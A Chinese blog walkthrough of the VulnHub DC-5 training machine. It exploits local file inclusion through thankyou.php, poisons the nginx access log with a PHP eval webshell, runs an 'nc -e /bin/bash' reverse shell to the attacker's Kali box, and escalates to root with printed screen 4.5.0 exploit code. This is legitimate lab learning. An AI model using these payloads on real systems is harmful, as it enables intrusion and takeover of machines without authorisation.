@@ -1,0 +1,335 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DC-5靶场 | 榴莲酥的碎碎念</title>
+<link rel="shortcut icon" href="https://dengdinshan.github.io/favicon.ico?v=1730519803442">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://dengdinshan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DC-5靶场 | 榴莲酥的碎碎念 - Atom Feed" href="https://dengdinshan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC-5
+靶场下载地址  https://www.vulnhub.com/entry/dc-5,314/
+下载后导入virtualbox
+kali ip 192.168.56.102
+靶机ip 192.168.56.109
+又想问我是怎么知..." />
+    <meta name="keywords" content="靶场" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://dengdinshan.github.io">
+  <img class="avatar" src="https://dengdinshan.github.io/images/avatar.png?v=1730519803442" alt="">
+  </a>
+  <h1 class="site-title">
+    榴莲酥的碎碎念
+  </h1>
+  <p class="site-description">
+    天下有情人终成眷属
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DC-5靶场
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-10-16
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://dengdinshan.github.io/tag/ne0Z-hhZT/" class="post-tag">
+                  # 靶场
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="dc-5">DC-5</h1>
+<p>靶场下载地址  https://www.vulnhub.com/entry/dc-5,314/</p>
+<p>下载后导入virtualbox</p>
+<p>kali ip 192.168.56.102</p>
+<p>靶机ip 192.168.56.109</p>
+<p>又想问我是怎么知道的？</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111447074.png" alt="image-20241011144134538" loading="lazy"></figure>
+<p>渗透第一步 信息搜集</p>
+<p>用nmap进行常规扫描查看端口 就像是生病去医院一样 拍个片一下子就明了了</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111447085.png" alt="image-20241011144622346" loading="lazy"></figure>
+<p>从扫描结果我们可以看出 开放了80、111、33544端口</p>
+<p>我们先从80端口去入手</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111449239.png" alt="image-20241011144911166" loading="lazy"></figure>
+<p>能够发现在最后一个栏目可以填写数据<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111450680.png" alt="image-20241011145003610" loading="lazy"></p>
+<p>查一下指纹</p>
+<figure data-type="image" tabindex="4"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241011145405119.png" alt="image-20241011145405119" loading="lazy"></figure>
+<p>也可以使用whatweb</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111454235.png" alt="image-20241011145433181" loading="lazy"></figure>
+<p>提交一下留言板 发现传参方式是GET传参</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111456089.png" alt="image-20241011145620046" loading="lazy"></figure>
+<p>好像有细微变化</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111457806.png" alt="image-20241011145732773" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111457168.png" alt="image-20241011145752138" loading="lazy"></figure>
+<p>只要一刷新页面 这个年份就会改变</p>
+<p>来扫一下目录</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111500356.png" alt="image-20241011150057280" loading="lazy"></figure>
+<p>发现footer.php是这个年月日</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111502157.png" alt="image-20241011150247121" loading="lazy"></figure>
+<p>刷新会更改  判断有footer.php的页面存在文件包含</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111507104.png" alt="image-20241011150711055" loading="lazy"></figure>
+<p>使用bp爆破<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111517130.png" alt="image-20241011151744076" loading="lazy"></p>
+<p>发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面</p>
+<p>确认footer.php的页面存在文件包含</p>
+<p>使用BurpSuite爆破文件包含的变量名即可能被包含的值</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111522792.png" alt="image-20241011152241737" loading="lazy"></figure>
+<p>爆破出参数名是file  路径有很多</p>
+<p>访问最短路径 /thankyou.php?file=%2e%2e%2fetc%2fpasswd</p>
+<p>成功包含到字典</p>
+<p>http://192.168.56.109/thankyou.php?file=%2fetc%2fpasswd</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111536044.png" alt="" loading="lazy"></figure>
+<p>http://192.168.56.109/thankyou.php?file=/etc/passwd</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111537177.png" alt="image-20241011153727119" loading="lazy"></figure>
+<p>好像出了点小毛病没有回显 重新安装靶场 下面的ip地址更新为</p>
+<p>靶机192.168.56.110</p>
+<p>kali  192.168.56.102</p>
+<p>终于上当了</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111704876.png" alt="image-20241011170422559" loading="lazy"></figure>
+<p>http://192.168.56.110/thankyou.php?file=../../../../var/log/nginx/error.log</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111704210.png" alt="image-20241011170435130" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111715251.png" alt="image-20241011171517158" loading="lazy"></figure>
+<p>写入一句话木马</p>
+<p>http://192.168.56.110/thankyou.php?file=../../../../var/log/nginx/access.log</p>
+<p>写入phpinfo</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111718053.png" alt="image-20241011171831003" loading="lazy"></figure>
+<p>重新打开日志文件可以看到成功写入，成功回显出phpinfo信息</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111721638.png" alt="image-20241011172101573" loading="lazy"></figure>
+<p>写入webshell</p>
+<p>采用<?php @eval($_REQUEST[powershell])?>替换上面的<?php phpinfo();?>就OK。</p>
+<p>GET <?php @eval($_REQUEST[powershell])?> HTTP/1.1</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111723208.png" alt="image-20241011172324156" loading="lazy"></figure>
+<p>重新进入页面</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121110021.png" alt="image-20241012111028900" loading="lazy"></figure>
+<p>能够从页面中看到挂马的日志</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121149710.png" alt="image-20241012114915659" loading="lazy"></figure>
+<p>使用蚁剑连接</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121148998.png" alt="image-20241012114823808" loading="lazy"></figure>
+<p>成功连接</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121151798.png" alt="image-20241012115134729" loading="lazy"></figure>
+<p>在/目录下的tmp创建一个新文件 叫做powershell</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121201450.png" alt="image-20241012120136383" loading="lazy"></figure>
+<p>在powershell里写入shell</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121202669.png" alt="image-20241012120206614" loading="lazy"></figure>
+<p>我们采用之前发现的文件包含漏洞包含我们新建的shell就可以访问到shell，我们的shell有输出，在页面下方可以看到我们的输出hello-world</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121438180.png" alt="image-20241012143803088" loading="lazy"></figure>
+<p>蚁剑重新连接webshell，右键添加数据，填入url以及密码，url就是我们新建的shell地址。</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121443657.png" alt="image-20241012144304602" loading="lazy"></figure>
+<p>连接成功打开虚拟终端</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121444052.png" alt="image-20241012144417006" loading="lazy"></figure>
+<p>蚁剑终端不如kali终端，我们反弹shell到kali</p>
+<p>在kali上打开监听</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121451313.png" alt="image-20241012145125271" loading="lazy"></figure>
+<p>靶机执行shell反弹命令</p>
+<p>nc -e /bin/bash 192.168.56.102 55555</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121452909.png" alt="image-20241012145212868" loading="lazy"></figure>
+<p>使用python进入交互式shell</p>
+<p>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121453006.png" alt="image-20241012145319964" loading="lazy"></figure>
+<p>查看能否进行suid提权的时候发现了一个有版本好的程序</p>
+<p>find / -perm -4000 2&gt;/dev/null #寻找有SUID权限（4000）的文件，不显示其他的错误信息相当于过滤。</p>
+<p>发现screen-4.5.0，使用41145.sh脚本提权<br>
+GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。<br>
+GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br>
+下面两条命令都行<br>
+find / -user root -perm -4000 -print 2&gt;/dev/null</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121455731.png" alt="image-20241012145525683" loading="lazy"></figure>
+<p>查找screen 4.5.0漏洞脚本文件</p>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121458785.png" alt="image-20241012145847734" loading="lazy"></figure>
+<p>发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下</p>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121501122.png" alt="image-20241012150123069" loading="lazy"></figure>
+<p>查看 41154.sh脚本文件</p>
+<figure data-type="image" tabindex="36"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121502115.png" alt="image-20241012150247019" loading="lazy"></figure>
+<p>按照脚本提示，先将第一部分内容写到libhax.c中(一共有三个部分)<br>
+创建一个文件夹存放三个部分的脚本</p>
+<figure data-type="image" tabindex="37"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121504737.png" alt="image-20241012150437687" loading="lazy"></figure>
+<p>创建libhax.c文件，用vim编辑  写入如下文件</p>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;sys/types.h&gt;<br>
+#include &lt;unistd.h&gt;<br>
+<strong>attribute</strong> ((<strong>constructor</strong>))<br>
+void dropshell(void){<br>
+chown(&quot;/tmp/rootshell&quot;, 0, 0);<br>
+chmod(&quot;/tmp/rootshell&quot;, 04755);<br>
+unlink(&quot;/etc/ld.so.preload&quot;);<br>
+printf(&quot;[+] done!\n&quot;);<br>
+}</p>
+<figure data-type="image" tabindex="38"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121506044.png" alt="image-20241012150635999" loading="lazy"></figure>
+<p>编译这个脚本</p>
+<p>gcc -fPIC -shared -ldl -o libhax.so libhax.c</p>
+<figure data-type="image" tabindex="39"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121507370.png" alt="image-20241012150729322" loading="lazy"></figure>
+<p>查看编译生成的os文件</p>
+<figure data-type="image" tabindex="40"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121509382.png" alt="image-20241012150915333" loading="lazy"></figure>
+<p>将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件<br>
+这里我直接采用vim创建文件  写入第二段</p>
+<figure data-type="image" tabindex="41"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121512487.png" alt="image-20241012151216433" loading="lazy"></figure>
+<p>编译.c文件</p>
+<p>gcc -fPIC -shared -ldl -o rootshell.so rootshell.c</p>
+<figure data-type="image" tabindex="42"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121523348.png" alt="image-20241012152358280" loading="lazy"></figure>
+<p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!/bin/bash表示执行环境。最后保存是需要输入:set ff=unix是为了防止脚本的格式错误。</p>
+<figure data-type="image" tabindex="43"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121535864.png" alt="image-20241012153547784" loading="lazy"></figure>
+<p>完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。</p>
+<p>将这三个文件传到靶机</p>
+<figure data-type="image" tabindex="44"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121537661.png" alt="image-20241012153704609" loading="lazy"></figure>
+<p>这里我把不要的删除</p>
+<figure data-type="image" tabindex="45"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121538576.png" alt="image-20241012153820530" loading="lazy"></figure>
+<p>这里我把文件通过xftp进行传输</p>
+<figure data-type="image" tabindex="46"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121546993.png" alt="image-20241012154647931" loading="lazy"></figure>
+<p>打开蚁剑，打开连接，进入文件系统，进入/tmp目录，右键选择文件上传</p>
+<figure data-type="image" tabindex="47"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121547436.png" alt="image-20241012154745372" loading="lazy"></figure>
+<p>在shell中切换到/tmp目录下（dc5.sh所在目录）<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121549961.png" alt="image-20241012154906918" loading="lazy"></p>
+<p>给dc5.sh加执行权限</p>
+<p>chmod +x dc5.sh</p>
+<p>chmod 777 dc5.sh</p>
+<figure data-type="image" tabindex="48"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121642432.png" alt="image-20241012164218314" loading="lazy"></figure>
+<p>版本不对 所以说提权不了</p>
+<p>重新试了一种方法但是不能在这个环境中编译成功</p>
+<figure data-type="image" tabindex="49"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121643981.png" alt="image-20241012164318934" loading="lazy"></figure>
+<p>更换<code>glibc</code>有点麻烦，我换<code>wsl2</code>用<code>ubuntu 20.04 glibc 2.31</code>进行编译，再传，成功提到<code>root</code>权限</p>
+<figure data-type="image" tabindex="50"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121644976.png" alt="image-20241012164407889" loading="lazy"></figure>
+<p>终于getshell</p>
+<figure data-type="image" tabindex="51"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121644160.png" alt="image-20241012164427041" loading="lazy"></figure>
+<p>总结</p>
+<p>扫描端口发现开放端口80、111、33544<br>
+进入web页面后发现一个提交栏，提交后页脚会有变化，猜测为文件包含漏洞<br>
+由于页面是nginx，nginx的默认日志路径为/var/log/nginx中，<br>
+采用url：192.168.56.110/thankyou.php?file=/var/log/nginx/access.log 查看<br>
+写入一句话木马，使用蚁剑连接后反弹shell回kali终端。<br>
+kali中使用sudo -l发现无法查看，则通过find / -perm -u=s -type f 2&gt;/dev/null来查看是否可以使用suid提权，发现可以利用screen-4.5.0进行提权。<br>
+searchsploit screen-4.5.0后下载相关文档，根据文档的指示写了三个文件libhax.so、rootshell、dc5.sh，通过蚁剑直接上传到靶机中，赋予dc5.sh 777权限并执行，即可成功。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#dc-5">DC-5</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://dengdinshan.github.io/post/dc-4-ba-chang/">
+              <h3 class="post-title">
+                DC-4靶场
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  总访客人数量3496次 本站总访问量7215次
+  <a class="rss" href="https://dengdinshan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
